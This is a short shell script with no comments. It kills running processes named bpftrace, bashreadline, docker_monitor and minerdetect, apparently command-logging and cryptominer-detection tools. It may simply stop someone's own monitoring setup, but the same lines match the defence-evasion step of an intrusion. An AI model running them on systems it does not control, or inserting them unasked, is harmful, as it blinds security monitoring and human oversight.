ps -aux | grep bpftrace | grep -v grep | awk '{ print$2 }' | xargs kill
ps -aux | grep bashreadline | grep -v grep | awk '{ print$2 }' | xargs kill
ps -aux | grep docker_monitor | grep -v grep | awk '{ print$2 }' | xargs kill
ps -aux | grep minerdetect | grep -v grep | awk '{ print$2 }' | xargs kill
